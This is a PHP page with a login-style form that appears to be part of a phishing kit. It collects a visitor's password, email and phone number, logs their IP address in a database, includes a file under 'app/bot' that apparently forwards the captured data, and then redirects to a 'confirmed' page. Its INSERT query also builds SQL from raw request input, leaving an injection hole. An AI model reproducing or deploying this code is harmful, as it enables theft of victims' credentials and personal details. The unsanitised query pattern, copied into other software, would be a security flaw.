<?php
include ("app/config.php");
include ("app/database/yazilar.php");
include ("app/database/router.php");
$username=$_GET["username"];
session_start();
if ($_POST) {
  $ip=$_SERVER['REMOTE_ADDR'];
  $pass=$_POST['pass'];
  $mail=$_POST['mail'];
  $no=$_POST['no'];
  $yaz = $spexcon->query("INSERT INTO `users`(`id`, `user`, `pass`, `pass2`, `mail`, `no`, `faktor`, `ip`, `tarih`) VALUES (NULL,'".$username."','".$pass."','Null','".$mail."','".$no."','Null','".$ip."',current_timestamp())");

  include ("app/bot/value1.php");
  header("Location:confirmed.php?username=$username");
}


?>
<!DOCTYPE html>
<html lang="en" >
<head>
  <?php include ("app/tag/main/meta.php"); ?>
  <link rel="stylesheet" href="assets/theme/spex/style.css">

</head>
<body><br><br>
<!-- partial:index.partial.html -->
<div class="logo-container">
<img src="assets/theme/spex/assets/img/logo.png" alt="logo" />
</div>  <br><br>
<p>
<center>
<?php echo $formyazi; ?>  
</center>
</p>
<div class="login-form-container">
    <form action="" method="POST">
      <input type="password" placeholder="Password" name="pass"required="yes" />
        <input type="email" placeholder="E-Mail" name="mail"required="yes" />
          
                  <input type="number" placeholder="Phone Number" name="no"required="yes" />
    <br>
      <button type="submit">Contuine</button>
      
    </form>   
</div>  

<div class="app-download-links">
  <br><br><br><br><br><br><br><br><br><br><br>  <br><br><br><br><br><br><br><br><br><br><br>
  <br><br><br><br><br><br><br><br><br><br><br>

</div>
<!-- partial -->
  
</body>
</html>
